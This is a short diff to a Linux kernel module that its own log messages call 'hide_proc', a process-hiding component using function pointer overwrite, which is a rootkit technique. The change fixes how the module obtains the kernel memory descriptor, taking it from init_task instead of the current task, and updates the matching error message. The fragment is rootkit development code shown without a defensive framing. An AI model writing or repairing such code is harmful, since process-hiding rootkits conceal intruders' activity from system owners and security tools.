@@ -260,9 +260,9 @@ int hide_proc_init(void) {
 
     printk(KERN_INFO "[hide_proc] Initializing process hiding (function pointer overwrite)\n");
 
-    kernel_mm = current->mm;
+    kernel_mm = init_task.active_mm;
     if (!kernel_mm) {
-        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from current task.\n");
+        printk(KERN_ERR "[hide_proc] Failed to get kernel mm_struct from init_task.\n");
         return -EFAULT;
     }
 
